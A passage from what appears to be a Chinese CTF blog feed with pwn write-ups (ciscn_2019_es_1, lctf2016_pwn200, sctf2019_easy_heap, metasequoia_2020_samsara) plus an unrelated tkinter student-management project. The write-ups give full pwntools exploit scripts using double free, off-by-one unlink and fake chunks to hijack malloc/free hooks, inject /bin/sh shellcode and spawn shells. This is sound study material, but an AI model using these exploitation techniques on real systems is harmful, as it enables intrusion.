title="这里也许是tachebin的机制，再次malloc时，会先创建一个堆记录下一个堆的地址，而下一个堆正是我们add函数的过程，在0x000055ac61f846c0这个地址写入的是free_hook的地址，但是它依然还是在bin链中的，这就很不解，明明已经被使用了，这时bin链的指针指到了free_hook，我们再malloc"></a>这里也许是tachebin的机制，再次malloc时，会先创建一个堆记录下一个堆的地址，而下一个堆正是我们add函数的过程，在0x000055ac61f846c0这个地址写入的是free_hook的地址，但是它依然还是在bin链中的，这就很不解，明明已经被使用了，这时bin链的指针指到了free_hook，我们再malloc</h4><p><img src="https://i0.imgs.ovh/2024/01/22/sJja2.png" alt="image-20230921164455578"></p><h4 id="这时bin链的指针指到了free-hook，我们再malloc两次就能把free-hook函数的地址内容改成system函数的地址-而都同add函数一样正常mollc，参数bin-sh放在堆3"><a href="#这时bin链的指针指到了free-hook，我们再malloc两次就能把free-hook函数的地址内容改成system函数的地址-而都同add函数一样正常mollc，参数bin-sh放在堆3" class="headerlink" title="这时bin链的指针指到了free_hook，我们再malloc两次就能把free_hook函数的地址内容改成system函数的地址,而都同add函数一样正常mollc，参数bin/sh放在堆3"></a>这时bin链的指针指到了free_hook，我们再malloc两次就能把free_hook函数的地址内容改成system函数的地址,而都同add函数一样正常mollc，参数bin/sh放在堆3</h4><p><img src="https://i0.imgs.ovh/2024/01/22/sJitK.png" alt="image-20230921164925744"></p><p><img src="https://i0.imgs.ovh/2024/01/22/sJ5wj.png" alt="image-20230921165411511"></p><p>exp</p><pre><code class="lang-py">from pwn import*from LibcSearcher import *#p=remote(&quot;node4.buuoj.cn&quot;,28022)p=process(&quot;./ciscn_2019_es_1&quot;)context.log_level=&quot;debug&quot;elf=ELF(&quot;./ciscn_2019_es_1&quot;)libc=ELF(&quot;./libc-2.27.so&quot;)def add(size,name):    p.recvuntil(&quot;choice:&quot;)    p.sendline(&quot;1&quot;)    p.recvuntil(&quot;name&quot;)    p.sendline(str(int(size)))    p.recvuntil(&quot;name:&quot;)    p.sendline(name)    p.recvuntil(&quot;call&quot;)    p.sendline(name)def show(dex):    p.sendlineafter(&quot;choice:&quot;,&#39;2&#39;)    p.sendlineafter(&quot;index:&quot;,str(dex))  def delete(dex):    p.sendlineafter(&quot;choice:&quot;,&#39;3&#39;)    p.sendlineafter(&quot;index:\n&quot;,str(dex)) add(0x410,&quot;AAAA&quot;)add(0x20,&quot;AAAA&quot;)add(0x20,&quot;bin/sh&quot;)delete(0)show(0)malloc_hook_addr = u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))-96-0x10base_addr = malloc_hook_addr - libc.symbols[&#39;__malloc_hook&#39;]free_hook = base_addr + libc.symbols[&#39;__free_hook&#39;]system_addr = base_addr + libc.symbols[&#39;system&#39;]delete(1)delete(1)gdb.attach(p)sleep(1)add(0x20,p64(free_hook))add(0x20,&#39;MMMM&#39;)add(0x20,p64(system_addr))delete(2)#p.sendline(payload)p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>lctf2016_pwn200</title>
      <link href="/2024/01/14/lctf2016_pwn200/"/>
      <url>/2024/01/14/lctf2016_pwn200/</url>
      
        <content type="html"><![CDATA[<h3 id="lctf2016-pwn200"><a href="#lctf2016-pwn200" class="headerlink" title="lctf2016_pwn200"></a>lctf2016_pwn200</h3><h4 id="一道有点难的堆题"><a href="#一道有点难的堆题" class="headerlink" title="一道有点难的堆题"></a>一道有点难的堆题</h4><h4 id="这是主函数的结构，当我们输入满0x40时能够把主函数的ebp的地址泄露出来"><a href="#这是主函数的结构，当我们输入满0x40时能够把主函数的ebp的地址泄露出来" class="headerlink" title="这是主函数的结构，当我们输入满0x40时能够把主函数的ebp的地址泄露出来"></a>这是主函数的结构，当我们输入满0x40时能够把主函数的ebp的地址泄露出来</h4><p><img src="https://i0.imgs.ovh/2024/01/14/hZ3VW.png" alt="image-20240114222351986"></p><h4 id="下面小a的末尾的rbp寄存器存着主函数的rbp"><a href="#下面小a的末尾的rbp寄存器存着主函数的rbp" class="headerlink" title="下面小a的末尾的rbp寄存器存着主函数的rbp"></a>下面小a的末尾的rbp寄存器存着主函数的rbp</h4><p><img src="https://i0.imgs.ovh/2024/01/14/hZfWv.png" alt="image-20240114222408532"></p><h4 id="后面还调用了两个函数，说明这两个函数的栈帧离得不远，而这个函数，可以构造我们的fakechunk-还有我们的shellcode"><a href="#后面还调用了两个函数，说明这两个函数的栈帧离得不远，而这个函数，可以构造我们的fakechunk-还有我们的shellcode" class="headerlink" title="后面还调用了两个函数，说明这两个函数的栈帧离得不远，而这个函数，可以构造我们的fakechunk,还有我们的shellcode"></a>后面还调用了两个函数，说明这两个函数的栈帧离得不远，而这个函数，可以构造我们的fakechunk,还有我们的shellcode</h4><p><img src="https://i0.imgs.ovh/2024/01/14/hZmge.png" alt="image-20240114222423230"></p><h4 id="shellcode第一个得是’-x00’防止复制过去，造成影响"><a href="#shellcode第一个得是’-x00’防止复制过去，造成影响" class="headerlink" title="shellcode第一个得是’\x00’防止复制过去，造成影响"></a>shellcode第一个得是’\x00’防止复制过去，造成影响</h4><h4 id="申请得到得堆的地址和给过去的不太一样，这是构造的栈的结构"><a href="#申请得到得堆的地址和给过去的不太一样，这是构造的栈的结构" class="headerlink" title="申请得到得堆的地址和给过去的不太一样，这是构造的栈的结构"></a>申请得到得堆的地址和给过去的不太一样，这是构造的栈的结构</h4><p><img src="https://i0.imgs.ovh/2024/01/14/hZ6N3.png" alt="image-20240114222437905"></p><p><img src="https://i0.imgs.ovh/2024/01/14/hZkp9.png" alt="image-20240114222456777"></p><h4 id="然后ptr指针的值被覆盖成栈上的，等我们free再malloc的时候就能申请到这，但是大小得是0x30，因为我们构造的fakechunk的大小是0x40的大小，这样才能malloc到我们的栈上，从而覆盖到返回地址，而返回地址得写成shellcode开始的地址。"><a href="#然后ptr指针的值被覆盖成栈上的，等我们free再malloc的时候就能申请到这，但是大小得是0x30，因为我们构造的fakechunk的大小是0x40的大小，这样才能malloc到我们的栈上，从而覆盖到返回地址，而返回地址得写成shellcode开始的地址。" class="headerlink" title="然后ptr指针的值被覆盖成栈上的，等我们free再malloc的时候就能申请到这，但是大小得是0x30，因为我们构造的fakechunk的大小是0x40的大小，这样才能malloc到我们的栈上，从而覆盖到返回地址，而返回地址得写成shellcode开始的地址。"></a>然后ptr指针的值被覆盖成栈上的，等我们free再malloc的时候就能申请到这，但是大小得是0x30，因为我们构造的fakechunk的大小是0x40的大小，这样才能malloc到我们的栈上，从而覆盖到返回地址，而返回地址得写成shellcode开始的地址。</h4><h4 id="shellcode的结构应该写出这样的结构。"><a href="#shellcode的结构应该写出这样的结构。" class="headerlink" title="shellcode的结构应该写出这样的结构。"></a>shellcode的结构应该写出这样的结构。</h4><p><img src="https://i0.imgs.ovh/2024/01/14/hZ07O.png" alt="image-20240114222514160"></p><pre><code class="lang-py">payload=3*p64(0)+p64(rbp-0xc0+1)</code></pre><h4 id="再次申请覆盖掉返回地址，最后程序返回的时候会执行shellcode"><a href="#再次申请覆盖掉返回地址，最后程序返回的时候会执行shellcode" class="headerlink" title="再次申请覆盖掉返回地址，最后程序返回的时候会执行shellcode"></a>再次申请覆盖掉返回地址，最后程序返回的时候会执行shellcode</h4><h4 id=""><a href="#" class="headerlink" title=""></a><img src="https://i0.imgs.ovh/2024/01/14/hZpiJ.png" alt="image-20231010144445729"></h4><pre><code class="lang-py">from pwn import*from LibcSearcher import *#p=remote(&quot;node4.buuoj.cn&quot;,28868)p=process(&quot;./pwn200&quot;)context.log_level=&quot;debug&quot;payload=&#39;a&#39;*0x30p.sendafter(&#39;u?&#39;,payload)p.recvuntil(&#39;a&#39;*0x30)rbp=u64(p.recv(6).ljust(8,&#39;\x00&#39;))print(hex(rbp))shellcode=&quot;\x00\x31\xf6\x48\xbb\x2f\x62\x69\x6e&quot;shellcode+= &quot;\x2f\x2f\x73\x68\x56\x53\x54\x5f&quot;shellcode += &quot;\x6a\x3b\x58\x31\xd2\x0f\x05&quot;payload=(shellcode+2*p64(0)+p64(0X41)).ljust(0x38,&#39;\x00&#39;)  #gouzhao fakebchunkpayload+=p64(rbp-0x90)p.sendlineafter(&#39;id ~~?&#39;,&#39;31&#39;)print(hex(rbp-0x90))p.sendlineafter(&#39;money~&#39;,payload)p.sendlineafter(&#39;choice : &#39;,&#39;2&#39;)#p.recvuntil(&#39;\n&#39;)gdb.attach(p)sleep(1)p.sendlineafter(&#39;choice : &#39;,&#39;1&#39;)p.sendlineafter(&#39;long?&#39;,&#39;48&#39;)payload=3*p64(0)+p64(rbp-0xc0+1)p.sendlineafter(&#39;money : &#39;,payload)p.sendlineafter(&#39;choice : &#39;,&#39;3&#39;)#p.sendline(payload)p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python课设</title>
      <link href="/2023/12/25/python%E8%AF%BE%E8%AE%BE/"/>
      <url>/2023/12/25/python%E8%AF%BE%E8%AE%BE/</url>
      
        <content type="html"><![CDATA[<pre><code class="lang-py">import tkinter as tkfrom tkinter import messagebox, simpledialogimport jsonimport reimport osSTUDENT_FILE = &#39;students.json&#39;def load_students():    if not os.path.exists(STUDENT_FILE):        return []    with open(STUDENT_FILE, &#39;r&#39;, encoding=&#39;utf-8&#39;) as file:        return json.load(file)def save_students(students):    with open(STUDENT_FILE, &#39;w&#39;, encoding=&#39;utf-8&#39;) as file:        json.dump(students, file, ensure_ascii=False, indent=2)def show_students(students):    sorted_students = sorted(students, key=lambda x: x[&#39;id&#39;])  # 按学号排序    students_text = &quot;&quot;    for student in sorted_students:        students_text += f&quot;学号: &#123;student[&#39;id&#39;]&#125;\n&quot;        students_text += f&quot;姓名: &#123;student[&#39;name&#39;]&#125;\n&quot;        students_text += f&quot;年龄: &#123;student[&#39;age&#39;]&#125;\n&quot;        students_text += f&quot;性别: &#123;student[&#39;gender&#39;]&#125;\n\n&quot;    return students_textdef validate_id(student_id):    return bool(student_id.strip())def add_student(students):    dialog = tk.Toplevel()    dialog.title(&quot;添加学生信息&quot;)    dialog.geometry(&quot;250x200+900+400&quot;)    tk.Label(dialog, text=&quot;学号：&quot;).grid(row=0, column=0, padx=10, pady=5)    id_var = tk.StringVar()    tk.Entry(dialog, textvariable=id_var).grid(row=0, column=1, padx=10, pady=5)    tk.Label(dialog, text=&quot;姓名：&quot;).grid(row=1, column=0, padx=10, pady=5)    name_var = tk.StringVar()    tk.Entry(dialog, textvariable=name_var).grid(row=1, column=1, padx=10, pady=5)    tk.Label(dialog, text=&quot;年龄：&quot;).grid(row=2, column=0, padx=10, pady=5)    age_var = tk.StringVar()    tk.Entry(dialog, textvariable=age_var).grid(row=2, column=1, padx=10, pady=5)    tk.Label(dialog, text=&quot;性别：&quot;).grid(row=3, column=0, padx=10, pady=5)    gender_var = tk.StringVar()    gender_var.set(&quot;男&quot;)    gender_menu = tk.OptionMenu(dialog, gender_var, &quot;男&quot;, &quot;女&quot;)    gender_menu.grid(row=3, column=1, padx=10, pady=5)    def add_student_action():        student_info = &#123;            &#39;id&#39;: id_var.get(),            &#39;name&#39;: name_var.get(),            &#39;age&#39;: age_var.get(),            &#39;gender&#39;: gender_var.get()        &#125;        if not student_info[&#39;id&#39;] or not validate_id(student_info[&#39;id&#39;]):            messagebox.showerror(&quot;错误&quot;, &quot;学号格式错误，请重新输入。&quot;)            return        if any(student[&#39;id&#39;] == student_info[&#39;id&#39;] for student in students):            messagebox.showerror(&quot;错误&quot;, &quot;学号已存在，请重新输入。&quot;)            return        students.append(student_info)        messagebox.showinfo(&quot;成功&quot;, &quot;学生信息添加成功！&quot;)        dialog.destroy()    add_button = tk.Button(dialog, text=&quot;添加&quot;, command=add_student_action)    add_button.grid(row=4, columnspan=2, pady=10)def edit_student(students):    student_id = simpledialog.askstring(&quot;输入&quot;, &quot;请输入要编辑的学号：&quot;)    if not student_id or not validate_id(student_id):        messagebox.showerror(&quot;错误&quot;, &quot;学号格式错误，请重新输入。&quot;)        return    student = next((s for s in students if s[&#39;id&#39;] == student_id), None)    if student:        messagebox.showinfo(&quot;信息&quot;, f&quot;学号: &#123;student[&#39;id&#39;]&#125;\n姓名: &#123;student[&#39;name&#39;]&#125;\n年龄: &#123;student[&#39;age&#39;]&#125;\n性别: &#123;student[&#39;gender&#39;]&#125;&quot;)        dialog = tk.Toplevel()        dialog.title(&quot;编辑学生信息&quot;)        dialog.geometry(&quot;250x200+900+400&quot;)        tk.Label(dialog, text=&quot;姓名：&quot;).grid(row=1, column=0, padx=10, pady=5)        name_var = tk.StringVar(value=student[&#39;name&#39;])        tk.Entry(dialog, textvariable=name_var).grid(row=1, column=1, padx=10, pady=5)        tk.Label(dialog, text=&quot;年龄：&quot;).grid(row=2, column=0, padx=10, pady=5)        age_var = tk.StringVar(value=str(student[&#39;age&#39;]))        tk.Entry(dialog, textvariable=age_var).grid(row=2, column=1, padx=10, pady=5)        tk.Label(dialog, text=&quot;性别：&quot;).grid(row=3, column=0, padx=10, pady=5)        gender_var = tk.StringVar(value=student[&#39;gender&#39;])        gender_menu = tk.OptionMenu(dialog, gender_var, &quot;男&quot;, &quot;女&quot;)        gender_menu.grid(row=3, column=1, padx=10, pady=5)        def edit_student_action():            student[&#39;name&#39;] = name_var.get()            student[&#39;age&#39;] = int(age_var.get())            student[&#39;gender&#39;] = gender_var.get()            messagebox.showinfo(&quot;成功&quot;, &quot;学生信息编辑成功！&quot;)            dialog.destroy()        edit_button = tk.Button(dialog, text=&quot;编辑&quot;, command=edit_student_action)        edit_button.grid(row=4, columnspan=2, pady=10)    else:        messagebox.showerror(&quot;错误&quot;, &quot;未找到该学生信息。&quot;)def delete_student(students):    student_id = simpledialog.askstring(&quot;输入&quot;, &quot;请输入要删除的学号：&quot;)    if not student_id or not validate_id(student_id):        messagebox.showerror(&quot;错误&quot;, &quot;学号格式错误，请重新输入。&quot;)        return    student = next((s for s in students if s[&#39;id&#39;] == student_id), None)    if student:        students.remove(student)        messagebox.showinfo(&quot;成功&quot;, &quot;学生信息删除成功！&quot;)    else:        messagebox.showerror(&quot;错误&quot;, &quot;未找到该学生信息。&quot;)def main():    root = tk.Tk()    root.title(&quot;学生信息管理系统&quot;)    students = load_students()    window_width = 800    window_height = 500    screen_width = root.winfo_screenwidth()    screen_height = root.winfo_screenheight()    x_position = (screen_width - window_width) // 2    y_position = (screen_height - window_height) // 2    root.geometry(f&quot;&#123;window_width&#125;x&#123;window_height&#125;+&#123;x_position&#125;+&#123;y_position&#125;&quot;)    def show_students_command():        students_text = show_students(students)        messagebox.showinfo(&quot;学生信息&quot;, students_text)    def add_student_command():        add_student(students)    def delete_student_command():        delete_student(students)    def edit_student_command():        edit_student(students)    def save_and_exit():        save_students(students)        root.destroy()    show_students_button = tk.Button(root, text=&quot;显示所有学生信息&quot;, command=show_students_command)    show_students_button.pack()    add_student_button = tk.Button(root, text=&quot;添加学生信息&quot;, command=add_student_command)    add_student_button.pack()    delete_student_button = tk.Button(root, text=&quot;删除学生信息&quot;, command=delete_student_command)    delete_student_button.pack()    edit_student_button = tk.Button(root, text=&quot;编辑学生信息&quot;, command=edit_student_command)    edit_student_button.pack()    exit_button = tk.Button(root, text=&quot;保存并退出&quot;, command=save_and_exit)    exit_button.pack()    root.mainloop()if __name__ == &quot;__main__&quot;:    main()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sctf2019_easy_heap</title>
      <link href="/2023/12/06/sctf2019-easy-heap/"/>
      <url>/2023/12/06/sctf2019-easy-heap/</url>
      
        <content type="html"><![CDATA[<h5 id="例行检查，保护全开"><a href="#例行检查，保护全开" class="headerlink" title="例行检查，保护全开"></a>例行检查，保护全开</h5><h5 id="调用了mmap函数，把0xFFFFFFF000的地址映射到内存中某个地址，并打印出来，很明显这道题得用shellcode来做，这个地址可读可写可运行，后面要用"><a href="#调用了mmap函数，把0xFFFFFFF000的地址映射到内存中某个地址，并打印出来，很明显这道题得用shellcode来做，这个地址可读可写可运行，后面要用" class="headerlink" title="调用了mmap函数，把0xFFFFFFF000的地址映射到内存中某个地址，并打印出来，很明显这道题得用shellcode来做，这个地址可读可写可运行，后面要用"></a>调用了mmap函数，把0xFFFFFFF000的地址映射到内存中某个地址，并打印出来，很明显这道题得用shellcode来做，这个地址可读可写可运行，后面要用</h5><p><img src="https://i.imgs.ovh/2023/12/04/3nFPj.png" alt="image-20231204213036915"></p><h5 id="add函数-会打印出堆的地址"><a href="#add函数-会打印出堆的地址" class="headerlink" title="add函数,会打印出堆的地址"></a>add函数,会打印出堆的地址</h5><p><img src="https://i.imgs.ovh/2023/12/04/3np8e.png" alt="image-20231204213219796"></p><h5 id="full函数，能输入内容到堆上"><a href="#full函数，能输入内容到堆上" class="headerlink" title="full函数，能输入内容到堆上"></a>full函数，能输入内容到堆上</h5><p><img src="https://i.imgs.ovh/2023/12/04/3n3A3.png" alt="image-20231204213548121"></p><h5 id="最后会增添一个’-x00’-存在off-by-one-漏洞"><a href="#最后会增添一个’-x00’-存在off-by-one-漏洞" class="headerlink" title="最后会增添一个’\x00’,存在off by one 漏洞"></a>最后会增添一个’\x00’,存在off by one 漏洞</h5><p><img src="https://i.imgs.ovh/2023/12/04/3nfs9.png" alt="image-20231204213619003"></p><h5 id="free函数，没什么漏洞"><a href="#free函数，没什么漏洞" class="headerlink" title="free函数，没什么漏洞"></a>free函数，没什么漏洞</h5><p><img src="https://i.imgs.ovh/2023/12/04/3nWVH.png" alt="image-20231204213731793"></p><h5 id="先接收mmap映射的地址"><a href="#先接收mmap映射的地址" class="headerlink" title="先接收mmap映射的地址"></a>先接收mmap映射的地址</h5><pre><code class="lang-py">p.recvuntil(b&#39;Mmap: &#39;)vmap = p.recvline().strip()vmap = int(vmap, 16)print(&#39;vmap=&gt;&#39;+hex(vmap))</code></pre><h5 id="做off-by-one这种题的话，有个技巧，一般都是先申请四个堆"><a href="#做off-by-one这种题的话，有个技巧，一般都是先申请四个堆" class="headerlink" title="做off-by-one这种题的话，有个技巧，一般都是先申请四个堆"></a>做off-by-one这种题的话，有个技巧，一般都是先申请四个堆</h5><pre><code class="lang-py">add(0x410) #0add(0x68) #1add(0x4f0) #2add(0x68) #3</code></pre><h5 id="然后释放第一个，然后填充第一个堆，利用sub-E2D函数的输入把堆2的size位改为0，然后释放堆2进行unlink操作，然后堆1会被夹在中间"><a href="#然后释放第一个，然后填充第一个堆，利用sub-E2D函数的输入把堆2的size位改为0，然后释放堆2进行unlink操作，然后堆1会被夹在中间" class="headerlink" title="然后释放第一个，然后填充第一个堆，利用sub_E2D函数的输入把堆2的size位改为0，然后释放堆2进行unlink操作，然后堆1会被夹在中间"></a>然后释放第一个，然后填充第一个堆，利用sub_E2D函数的输入把堆2的size位改为0，然后释放堆2进行unlink操作，然后堆1会被夹在中间</h5><pre><code class="lang-py">free(0)payload=p64(0)*12+p64(0x490)fill(1,payload)</code></pre><p><img src="https://i.imgs.ovh/2023/12/04/3HLO5.png" alt="image-20231204220708856"></p><h5 id="释放堆2，会进行unlink"><a href="#释放堆2，会进行unlink" class="headerlink" title="释放堆2，会进行unlink"></a>释放堆2，会进行unlink</h5><p><img src="https://i.imgs.ovh/2023/12/04/3H2lX.png" alt="image-20231204220956361"></p><h5 id="再申请一次0x410和0x68大小的堆，堆2会和堆1的位置重合"><a href="#再申请一次0x410和0x68大小的堆，堆2会和堆1的位置重合" class="headerlink" title="再申请一次0x410和0x68大小的堆，堆2会和堆1的位置重合"></a>再申请一次0x410和0x68大小的堆，堆2会和堆1的位置重合</h5><p><img src="https://i.imgs.ovh/2023/12/04/3H6lu.png" alt="image-20231204223334972"></p><h5 id="再delete几次，相当于double-free了堆2"><a href="#再delete几次，相当于double-free了堆2" class="headerlink" title="再delete几次，相当于double free了堆2"></a>再delete几次，相当于double free了堆2</h5><pre><code class="lang-py">delete(3)delete(1) #1=&gt;#3 delete(2) #2(1)=&gt;1</code></pre><p><img src="https://i.imgs.ovh/2023/12/04/3H3Qp.png" alt="image-20231204223004490"></p><h5 id="接下来改bin链指针成改成vmap的，写上shellcode"><a href="#接下来改bin链指针成改成vmap的，写上shellcode" class="headerlink" title="接下来改bin链指针成改成vmap的，写上shellcode"></a>接下来改bin链指针成改成vmap的，写上shellcode</h5><p><img src="https://i.imgs.ovh/2023/12/06/3gchT.png" alt="image-20231206200052135"></p><h5 id="上面的话堆2是没有free的，然后用上面的方式再unlink一次，再add0x410大小的堆，会在堆2的fd指针上有main-arena-96的地址。"><a href="#上面的话堆2是没有free的，然后用上面的方式再unlink一次，再add0x410大小的堆，会在堆2的fd指针上有main-arena-96的地址。" class="headerlink" title="上面的话堆2是没有free的，然后用上面的方式再unlink一次，再add0x410大小的堆，会在堆2的fd指针上有main_arena+96的地址。"></a>上面的话堆2是没有free的，然后用上面的方式再unlink一次，再add0x410大小的堆，会在堆2的fd指针上有main_arena+96的地址。</h5><pre><code class="lang-py">fill(1,payload) delete(1)delete(4) #unlinkadd(0x410) # 0</code></pre><p><img src="https://i.imgs.ovh/2023/12/09/feBe9.png" alt="image-20231209222142417"></p><h5 id="fill堆2一个字节，将其改为0x30，既是mallloc-hook的地址"><a href="#fill堆2一个字节，将其改为0x30，既是mallloc-hook的地址" class="headerlink" title="fill堆2一个字节，将其改为0x30，既是mallloc_hook的地址"></a>fill堆2一个字节，将其改为0x30，既是mallloc_hook的地址</h5><p><img src="https://i.imgs.ovh/2023/12/09/feIGO.png" alt="image-20231209222512116"></p><h5 id="再malloc0x68两次，第二次写上vmap的地址-再任意申请一次堆即可提权"><a href="#再malloc0x68两次，第二次写上vmap的地址-再任意申请一次堆即可提权" class="headerlink" title="再malloc0x68两次，第二次写上vmap的地址,再任意申请一次堆即可提权"></a>再malloc0x68两次，第二次写上vmap的地址,再任意申请一次堆即可提权</h5><pre><code class="lang-py">add(0x68) #1fill(1,p64(vmap)) # 4add(0x68) #4fill(4,p64(vmap))add(0x20)</code></pre><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*from LibcSearcher import *#p=remote(&quot;node4.buuoj.cn&quot;,28038)p=process(&quot;./sctf2019_easy_heap&quot;)context.log_level=&quot;debug&quot;libc=ELF(&#39;./libc-2.27.so&#39;)context.arch=&#39;amd64&#39;#context=arch(&#39;amd64&#39;)def add(size):    p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;1&#39;)    p.sendlineafter(&#39;Size: &#39;,str(size))def fill(index,content):    p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;3&#39;)    p.sendlineafter(&#39;Index:&#39;,str(index))    p.sendlineafter(&#39;Content:&#39;,content)def delete(index):    p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;2&#39;)    p.sendlineafter(&#39;Index: &#39;,str(index))p.recvuntil(b&#39;Mmap: &#39;)vmap = p.recvline().strip()vmap = int(vmap, 16)print(&#39;vmap=&gt;&#39;+hex(vmap))add(0x410) #0add(0x68) #1add(0x4f0) #2add(0x68) #3payload=p64(0)*12+p64(0x490)delete(0)fill(1,payload)delete(2)add(0x410) #0add(0x68)  #2 lead to chunk1delete(3)delete(1) #1=&gt;3delete(2) #1=&gt;1 in the similar case we use by UAF,but it is not.add(0x68) #1fill(1,p64(vmap))add(0x68) #2add(0x68) #3shellcode=asm(shellcraft.sh())fill(3,shellcode)add(0x4f0) #4delete(0) #free 0x410fill(1,payload) delete(1)delete(4) #unlinkadd(0x410) # 0gdb.attach(p)sleep(1)pause()fill(2,&#39;\x30&#39;)add(0x68) #1fill(1,p64(vmap)) # 4add(0x68) #4fill(4,p64(vmap))add(0x20)p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>metasequoia_2020_samsara</title>
      <link href="/2023/12/03/metasequoia-2020-samsara/"/>
      <url>/2023/12/03/metasequoia-2020-samsara/</url>
      
        <content type="html"><![CDATA[<h5 id="保护全开，就不放了"><a href="#保护全开，就不放了" class="headerlink" title="保护全开，就不放了"></a>保护全开，就不放了</h5><h5 id="程序挺简单的，菜单直接放出来了，存在double-free漏洞，只需要让v8-0xdeadbeef就能拿到flag"><a href="#程序挺简单的，菜单直接放出来了，存在double-free漏洞，只需要让v8-0xdeadbeef就能拿到flag" class="headerlink" title="程序挺简单的，菜单直接放出来了，存在double free漏洞，只需要让v8=0xdeadbeef就能拿到flag"></a>程序挺简单的，菜单直接放出来了，存在double free漏洞，只需要让v8=0xdeadbeef就能拿到flag</h5><p><img src="https://i.imgs.ovh/2023/12/03/wSene.png" alt=""></p><h5 id="先double-free-然后用case4打印出v7的地址，在栈上v8的地址等于v7-0x8-double-free改地址的时候改到v7-0x8-然后v7的值得是0x20，构造fakechunk，然后malloc的时候在v7-0x8-0x10的地方写上0xdeadbeef"><a href="#先double-free-然后用case4打印出v7的地址，在栈上v8的地址等于v7-0x8-double-free改地址的时候改到v7-0x8-然后v7的值得是0x20，构造fakechunk，然后malloc的时候在v7-0x8-0x10的地方写上0xdeadbeef" class="headerlink" title="先double free,然后用case4打印出v7的地址，在栈上v8的地址等于v7+0x8,double free改地址的时候改到v7-0x8,然后v7的值得是0x20，构造fakechunk，然后malloc的时候在v7-0x8+0x10的地方写上0xdeadbeef"></a>先double free,然后用case4打印出v7的地址，在栈上v8的地址等于v7+0x8,double free改地址的时候改到v7-0x8,然后v7的值得是0x20，构造fakechunk，然后malloc的时候在v7-0x8+0x10的地方写上0xdeadbeef</h5><p><img src="https://i.imgs.ovh/2023/12/03/wukUH.png" alt="image-20231203164238201"></p><p><img src="https://i.imgs.ovh/2023/12/03/wu1MT.png" alt="image-20231203165112607"></p><h5 id="开始的时候得多申请一个堆堆3，其他师傅说防止free-掉的两个chunk和top-chunk合并，脚本跑的话没逝，但以后还是得注意"><a href="#开始的时候得多申请一个堆堆3，其他师傅说防止free-掉的两个chunk和top-chunk合并，脚本跑的话没逝，但以后还是得注意" class="headerlink" title="开始的时候得多申请一个堆堆3，其他师傅说防止free 掉的两个chunk和top chunk合并，脚本跑的话没逝，但以后还是得注意"></a>开始的时候得多申请一个堆堆3，其他师傅说防止free 掉的两个chunk和top chunk合并，脚本跑的话没逝，但以后还是得注意</h5><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*from LibcSearcher import *#p=remote(&quot;node4.buuoj.cn&quot;,28766)p=process(&quot;./metasequoia_2020_samsara&quot;)context.log_level=&quot;debug&quot;libc=ELF(&#39;./libc-2.23.so&#39;)def add():    p.sendlineafter(&#39;choice &gt; &#39;,&#39;1&#39;)def free(index):    p.sendlineafter(&#39;choice &gt; &#39;,&#39;2&#39;)    p.sendlineafter(&#39;Index&#39;,str(index))def full(index,content):    p.sendlineafter(&#39;choice &gt; &#39;,&#39;3&#39;)    p.sendlineafter(&#39;Index&#39;,str(index))    p.sendlineafter(&#39;Ingredient:&#39;,content)def show():    p.sendlineafter(&#39;choice &gt; &#39;,&#39;4&#39;)def move(content):    p.sendlineafter(&#39;choice &gt; &#39;,&#39;5&#39;)    p.sendlineafter(&#39;Which kingdom?&#39;,content)add() #0add() #1add() #2free(0)free(1)free(0)show()p.recvuntil(&#39;Your lair is at: &#39;)addr=int(p.recv(14),16)#addr = int(p.recvuntil(&#39;\n&#39;, drop=True), 16)print(&#39;addr=&gt;&#39;+hex(addr))move(str(0x20))gdb.attach(p)pause()#sleep(1)v8=addr-0x8add() #3full(3,str(v8))add() #4add() #5add() #6full(6,str(0xdeadbeef))p.sendlineafter(&#39;choice &gt; &#39;,&#39;6&#39;)p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_2019_c_3</title>
      <link href="/2023/11/27/ciscn-2019-c-3/"/>
      <url>/2023/11/27/ciscn-2019-c-3/</url>
      
        <content type="html"><![CDATA[<p><img src="https://i.imgs.ovh/2023/11/27/pnlWA.png" alt="image-20231127212242738"></p><h5 id="开启了全局偏移"><a href="#开启了全局偏移" class="headerlink" title="开启了全局偏移"></a>开启了全局偏移</h5><h5 id="add函数，只允许申请固定的几个大小的堆，在堆地址-16的地方写入内容，所以改不了fd和bk地址，堆地址开始写上0，堆地址-8的地址会加上随机数"><a href="#add函数，只允许申请固定的几个大小的堆，在堆地址-16的地方写入内容，所以改不了fd和bk地址，堆地址开始写上0，堆地址-8的地址会加上随机数" class="headerlink" title="add函数，只允许申请固定的几个大小的堆，在堆地址+16的地方写入内容，所以改不了fd和bk地址，堆地址开始写上0，堆地址+8的地址会加上随机数"></a>add函数，只允许申请固定的几个大小的堆，在堆地址+16的地方写入内容，所以改不了fd和bk地址，堆地址开始写上0，堆地址+8的地址会加上随机数</h5><p><img src="https://i.imgs.ovh/2023/11/27/pnne5.png" alt="image-20231127212332956"></p><h5 id="show函数，会把堆地址上的几个数分别打印出来，可以打印出main-arena-96的地址"><a href="#show函数，会把堆地址上的几个数分别打印出来，可以打印出main-arena-96的地址" class="headerlink" title="show函数，会把堆地址上的几个数分别打印出来，可以打印出main_arena+96的地址"></a>show函数，会把堆地址上的几个数分别打印出来，可以打印出main_arena+96的地址</h5><p><img src="https://i.imgs.ovh/2023/11/27/pnhGT.png" alt="image-20231127213053713"></p><h5 id="delete函数，存在很明显的UAF漏洞"><a href="#delete函数，存在很明显的UAF漏洞" class="headerlink" title="delete函数，存在很明显的UAF漏洞"></a>delete函数，存在很明显的UAF漏洞</h5><p><img src="https://i.imgs.ovh/2023/11/27/pnb8d.png" alt="image-20231127213159824"></p><h5 id="还有个后面函数，可以改堆fd位置的东西，每次能使其加一，后面能改其bin指针"><a href="#还有个后面函数，可以改堆fd位置的东西，每次能使其加一，后面能改其bin指针" class="headerlink" 